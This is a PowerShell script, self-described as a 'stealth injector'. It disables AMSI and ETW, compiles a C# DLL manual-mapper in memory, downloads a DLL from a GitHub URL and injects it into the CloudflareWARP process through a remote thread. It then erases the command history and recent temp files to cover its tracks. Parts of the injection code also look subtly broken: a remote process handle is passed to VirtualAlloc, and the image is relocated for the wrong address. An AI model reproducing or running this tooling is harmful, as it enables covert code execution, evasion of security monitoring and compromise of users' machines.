[CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact="High")]
param()

Set-StrictMode -Version Latest

# ============================================================
# ★★★ DEBUG MODE — Console will stay visible ★★★
# ============================================================
$DebugMode = $true

function Write-DebugInfo {
    param($Message, $Color = "Cyan")
    if ($DebugMode) {
        Write-Host "[DEBUG] $Message" -ForegroundColor $Color
    }
}

# ============================================================
# ★★★ START ★★★
# ============================================================
Write-Host "========================================" -ForegroundColor Magenta
Write-Host "      STEALTH INJECTOR (DEBUG MODE)     " -ForegroundColor Magenta
Write-Host "========================================" -ForegroundColor Magenta
Write-DebugInfo "Script starting..." -Color "Green"

# --- Admin check ---
if (!([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")))
{
    Write-DebugInfo "❌ Not running as Administrator! Exiting." -Color "Red"
    Read-Host "Press ENTER to exit"
    exit
} else {
    Write-DebugInfo "✅ Running as Administrator." -Color "Green"
}

# ============================================================
# ★★★ 1. Console Hide — SKIP (keep visible for debug) ★★★
# ============================================================
Write-DebugInfo "Console will stay visible (debug mode)." -Color "Yellow"

# ============================================================
# ★★★ 2. AMSI + ETW Bypass ★★★
# ============================================================
Write-DebugInfo "Bypassing AMSI and ETW..." -Color "Yellow"
try {
    # AMSI
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    $a.GetField('amsiSession','NonPublic,Static').SetValue($null,$null)
    Write-DebugInfo "✅ AMSI bypassed." -Color "Green"

    # ETW
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class EtwOff {
        [DllImport("ntdll.dll")] static extern int NtSetInformationProcess(IntPtr h, int c, IntPtr i, int l);
        public static void Disable() {
            IntPtr p = System.Diagnostics.Process.GetCurrentProcess().Handle;
            IntPtr ptr = Marshal.AllocHGlobal(4);
            Marshal.WriteInt32(ptr, 0);
            NtSetInformationProcess(p, 0x5E, ptr, 4);
            Marshal.FreeHGlobal(ptr);
        }
    }
"@ -IgnoreWarnings
    [EtwOff]::Disable()
    Write-DebugInfo "✅ ETW bypassed." -Color "Green"
} catch {
    Write-DebugInfo "❌ AMSI/ETW bypass failed: $_" -Color "Red"
    Read-Host "Press ENTER to exit"
    exit
}

# ============================================================
# ★★★ 3. Compile C# Loader (in-memory) ★★★
# ============================================================
Write-DebugInfo "Compiling C# loader in memory..." -Color "Yellow"

$kernel = @'
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;

public class ManualMapResult
{
    public IntPtr ImageBase;
    public uint ImageSize;
    public IntPtr DllMainAddr;
    public long Delta;
    public bool Is64Bit;
}

public static class NativeLoader
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern IntPtr GetModuleHandleA(string n);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern IntPtr LoadLibraryA(string n);
    [DllImport("kernel32.dll")]
    static extern bool FlushInstructionCache(IntPtr h, IntPtr a, UIntPtr s);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();
    [DllImport("ntdll.dll")]
    static extern int RtlCreateUserThread(IntPtr ProcessHandle, IntPtr ThreadSecurityDescriptor, bool CreateSuspended, uint StackZeroBits, uint StackReserve, uint StackCommit, IntPtr StartAddress, IntPtr Parameter, out IntPtr ThreadHandle, IntPtr ClientId);
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);

    const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    const uint MC = 0x1000, MR = 0x2000;
    const uint PRW = 0x04, PER = 0x20, PERW = 0x40, PRO = 0x02;

    static ushort U16(byte[] b, int o) { return BitConverter.ToUInt16(b, o); }
    static uint   U32(byte[] b, int o) { return BitConverter.ToUInt32(b, o); }
    static ulong  U64(byte[] b, int o) { return BitConverter.ToUInt64(b, o); }

    static uint   RU32(IntPtr p, long o) { return (uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o)); }
    static ushort RU16(IntPtr p, long o) { return (ushort)Marshal.ReadInt16((IntPtr)(p.ToInt64()+o)); }
    static ulong  RU64(IntPtr p, long o) {
        long lo = (long)(uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o));
        long hi = (long)(uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o+4));
        return (ulong)((hi<<32)|lo);
    }
    static void WU64(IntPtr p, long o, ulong v) { Marshal.WriteInt64((IntPtr)(p.ToInt64()+o),(long)v); }
    static void WU32(IntPtr p, long o, uint v)   { Marshal.WriteInt32((IntPtr)(p.ToInt64()+o),(int)v); }

    static string RAscii(IntPtr p, long o) {
        var sb = new StringBuilder();
        for (int i=0;i<260;i++) { byte b=Marshal.ReadByte((IntPtr)(p.ToInt64()+o+i)); if(b==0)break; sb.Append((char)b); }
        return sb.ToString();
    }

    static uint SProt(uint c) {
        bool x=(c&0x20000000)!=0, w=(c&0x80000000)!=0, r=(c&0x40000000)!=0;
        if(x&&w) return PERW; if(x&&r) return PER; if(x) return PER; if(w) return PRW; return PRO;
    }

    struct Sec { public uint VS,VA,SRD,PRD,Ch; }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate bool DllMainFn(IntPtr h, uint r, IntPtr p);

    public static bool InjectIntoWarp(byte[] dll)
    {
        try {
            Console.WriteLine("[C#] Searching for CloudflareWARP process...");
            int pid = 0;
            foreach (var p in Process.GetProcessesByName("CloudflareWARP")) { pid = p.Id; break; }
            if (pid == 0) {
                Console.WriteLine("[C#] ERROR: CloudflareWARP process not found.");
                return false;
            }
            Console.WriteLine("[C#] Found CloudflareWARP PID: " + pid);

            Console.WriteLine("[C#] Opening process...");
            IntPtr hProc = OpenProcess(PROCESS_ALL_ACCESS, false, (uint)pid);
            if (hProc == IntPtr.Zero) {
                Console.WriteLine("[C#] ERROR: OpenProcess failed.");
                return false;
            }
            Console.WriteLine("[C#] Process opened successfully.");

            Console.WriteLine("[C#] Manual mapping DLL...");
            var result = Map(dll, false);
            if (result.ImageBase == IntPtr.Zero) {
                Console.WriteLine("[C#] ERROR: Manual mapping failed.");
                return false;
            }
            Console.WriteLine("[C#] Manual mapping successful. ImageBase: 0x" + result.ImageBase.ToString("X"));

            Console.WriteLine("[C#] Allocating memory in WARP process...");
            IntPtr remoteBase = IntPtr.Zero;
            UIntPtr size = (UIntPtr)result.ImageSize;
            remoteBase = VirtualAlloc(hProc, UIntPtr.Zero, (uint)size, MC|MR, PER);
            if (remoteBase == IntPtr.Zero) {
                Console.WriteLine("[C#] ERROR: VirtualAllocEx failed.");
                return false;
            }
            Console.WriteLine("[C#] Memory allocated at: 0x" + remoteBase.ToString("X"));

            Console.WriteLine("[C#] Copying DLL image to remote process...");
            byte[] imageBytes = new byte[result.ImageSize];
            Marshal.Copy(result.ImageBase, imageBytes, 0, (int)result.ImageSize);
            IntPtr bytesWritten;
            WriteProcessMemory(hProc, remoteBase, imageBytes, (uint)result.ImageSize, out bytesWritten);
            Console.WriteLine("[C#] Copied " + bytesWritten.ToInt64() + " bytes.");

            IntPtr entryPoint = (IntPtr)(remoteBase.ToInt64() + (result.DllMainAddr.ToInt64() - result.ImageBase.ToInt64()));
            Console.WriteLine("[C#] Entry point: 0x" + entryPoint.ToString("X"));

            Console.WriteLine("[C#] Creating remote thread via RtlCreateUserThread...");
            IntPtr hThread;
            int status = RtlCreateUserThread(hProc, IntPtr.Zero, false, 0, 0, 0, entryPoint, IntPtr.Zero, out hThread, IntPtr.Zero);
            if (status != 0) {
                Console.WriteLine("[C#] ERROR: RtlCreateUserThread failed, status=" + status);
                return false;
            }
            Console.WriteLine("[C#] Remote thread created successfully.");

            System.Threading.Thread.Sleep(200);
            CloseHandle(hThread);
            CloseHandle(hProc);
            Console.WriteLine("[C#] Injection complete.");
            return true;
        } catch (Exception ex) {
            Console.WriteLine("[C#] EXCEPTION: " + ex.Message);
            return false;
        }
    }

    private static ManualMapResult Map(byte[] dll, bool callEntry)
    {
        var res = new ManualMapResult();
        if(U16(dll,0)!=0x5A4D) throw new Exception("Missing MZ");
        int lfa = BitConverter.ToInt32(dll,0x3C);
        if(U32(dll,lfa)!=0x4550u) throw new Exception("Bad PE sig");

        int co=lfa+4; ushort ns=U16(dll,co+2), ohs=U16(dll,co+16);
        int oo=co+20; bool is64=(U16(dll,oo)==0x020B); res.Is64Bit=is64;
        uint ep=U32(dll,oo+16), soi=U32(dll,oo+56), soh=U32(dll,oo+60);
        ulong ib=is64?U64(dll,oo+24):U32(dll,oo+28);
        res.ImageSize=soi;

        int dd=is64?oo+112:oo+96;
        uint irva=U32(dll,dd+8), rrva=U32(dll,dd+40), rsz=U32(dll,dd+44);

        int st=oo+ohs; var secs=new Sec[ns];
        for(int i=0;i<ns;i++){int b=st+i*40;secs[i]=new Sec{VS=U32(dll,b+8),VA=U32(dll,b+12),SRD=U32(dll,b+16),PRD=U32(dll,b+20),Ch=U32(dll,b+36)};}

        IntPtr img=VirtualAlloc(IntPtr.Zero,(UIntPtr)soi,MC|MR,PRW);
        if(img==IntPtr.Zero) throw new Exception("VirtualAlloc failed");
        res.ImageBase=img; long ab=img.ToInt64(), delta=ab-(long)ib; res.Delta=delta;

        Marshal.Copy(dll,0,img,(int)soh);
        foreach(var s in secs){
            if(s.SRD==0) continue;
            uint cs=s.VS==0?s.SRD:Math.Min(s.SRD,s.VS);
            if(s.PRD+cs>(uint)dll.Length){cs=(uint)dll.Length-s.PRD; if(cs==0)continue;}
            Marshal.Copy(dll,(int)s.PRD,(IntPtr)(ab+s.VA),(int)cs);
        }

        if(rrva!=0&&delta!=0){
            uint ro=rrva, re=rrva+rsz;
            while(ro<re){
                uint pg=RU32(img,ro), bs=RU32(img,ro+4); if(bs==0)break;
                int ne=(int)(bs-8)/2;
                for(int i=0;i<ne;i++){
                    ushort e=RU16(img,ro+8+i*2); int ty=(e>>12)&0xF, of=e&0xFFF;
                    if(ty==0)continue; long tr=pg+of;
                    if(ty==10){ulong c=RU64(img,tr);WU64(img,tr,(ulong)((long)c+delta));}
                    else if(ty==3){uint c=RU32(img,tr);WU32(img,tr,(uint)((long)c+delta));}
                }
                ro+=bs;
            }
        }

        if(irva!=0){
            int ie=0;
            while(true){
                long eo=irva+ie*20; uint nr=RU32(img,eo+12),ir=RU32(img,eo+16),inr=RU32(img,eo);
                if(nr==0)break;
                string dn=RAscii(img,nr);
                IntPtr hd=GetModuleHandleA(dn); if(hd==IntPtr.Zero) hd=LoadLibraryA(dn);
                if(hd==IntPtr.Zero){ie++;continue;}
                long to=0; uint tb=inr!=0?inr:ir; int ts=is64?8:4;
                while(true){
                    long te=tb+to; long tv=is64?(long)RU64(img,te):(long)RU32(img,te);
                    if(tv==0)break;
                    long of=is64?unchecked((long)0x8000000000000000L):(long)0x80000000;
                    IntPtr fa=IntPtr.Zero;
                    if((tv&of)!=0) fa=GetProcAddress(hd,(IntPtr)(int)(tv&0xFFFF));
                    else fa=GetProcAddress(hd,RAscii(img,tv+2));
                    if(fa!=IntPtr.Zero){
                        IntPtr ia=(IntPtr)(ab+ir+to);
                        if(is64) Marshal.WriteInt64(ia,fa.ToInt64()); else Marshal.WriteInt32(ia,fa.ToInt32());
                    }
                    to+=ts;
                }
                ie++;
            }
        }

        foreach(var s in secs){
            uint sz=Math.Max(s.VS,s.SRD); if(sz==0)continue; uint op;
            VirtualProtect((IntPtr)(ab+s.VA),(UIntPtr)sz,SProt(s.Ch),out op);
        }
        FlushInstructionCache(GetCurrentProcess(),img,(UIntPtr)soi);

        res.DllMainAddr=IntPtr.Zero;
        if(callEntry&&ep!=0){
            res.DllMainAddr=(IntPtr)(ab+ep);
            try{var fn=(DllMainFn)Marshal.GetDelegateForFunctionPointer(res.DllMainAddr,typeof(DllMainFn));fn(img,1,IntPtr.Zero);}
            catch{}
        }
        return res;
    }

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
}
'@

try {
    $compiler = [System.CodeDom.Compiler.CodeDomProvider]::CreateProvider('CSharp')
    $params = New-Object System.CodeDom.Compiler.CompilerParameters
    $params.GenerateInMemory = $true
    $params.GenerateExecutable = $false
    $params.IncludeDebugInformation = $false
    $params.CompilerOptions = '/target:library /optimize+'
    $params.ReferencedAssemblies.AddRange(@('System.dll', 'System.Runtime.InteropServices.dll', 'System.Diagnostics.Process.dll'))
    $result = $compiler.CompileAssemblyFromSource($params, $kernel)
    if ($result.Errors.Count -gt 0) {
        Write-DebugInfo "❌ Compilation error: $($result.Errors[0].ErrorText)" -Color "Red"
        Read-Host "Press ENTER to exit"
        exit
    }
    Write-DebugInfo "✅ C# loader compiled successfully." -Color "Green"
} catch {
    Write-DebugInfo "❌ Compilation failed: $_" -Color "Red"
    Read-Host "Press ENTER to exit"
    exit
}

$assembly = $result.CompiledAssembly
$loaderType = $assembly.GetType('NativeLoader')
$method = $loaderType.GetMethod('InjectIntoWarp')

# ============================================================
# ★★★ 5. DLL Download ★★★
# ============================================================
Write-DebugInfo "Downloading DLL from GitHub..." -Color "Yellow"
try {
    $bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/desert007/bios/raw/refs/heads/main/version.dll")
    Write-DebugInfo "✅ DLL downloaded successfully (size: $($bytes.Length) bytes)" -Color "Green"
} catch {
    Write-DebugInfo "❌ DLL download failed: $_" -Color "Red"
    Read-Host "Press ENTER to exit"
    exit
}

# ============================================================
# ★★★ 6. Injection Call ★★★
# ============================================================
Write-DebugInfo "Calling injection method..." -Color "Yellow"
Write-Host ""
Write-Host "========== C# OUTPUT ==========" -ForegroundColor Magenta
try {
    $success = $method.Invoke($null, @($bytes))
    Write-Host "=================================" -ForegroundColor Magenta
    if ($success) {
        Write-DebugInfo "✅ Injection completed successfully!" -Color "Green"
    } else {
        Write-DebugInfo "❌ Injection failed. Check C# output above." -Color "Red"
    }
} catch {
    Write-Host "=================================" -ForegroundColor Magenta
    Write-DebugInfo "❌ Injection call error: $_" -Color "Red"
}

# ============================================================
# ★★★ 7. Cleanup ★★★
# ============================================================
Write-DebugInfo "Cleaning up..." -Color "Yellow"
[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()
Clear-History
$historyPath = (Get-PSReadlineOption).HistorySavePath
if (Test-Path $historyPath) { Clear-Content -Path $historyPath -Force }
Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Write-DebugInfo "✅ Cleanup complete." -Color "Green"

# ============================================================
# ★★★ END — KEEP CONSOLE OPEN ★★★
# ============================================================
Write-DebugInfo "Script finished. Press ENTER to close this window." -Color "Magenta"
Read-Host
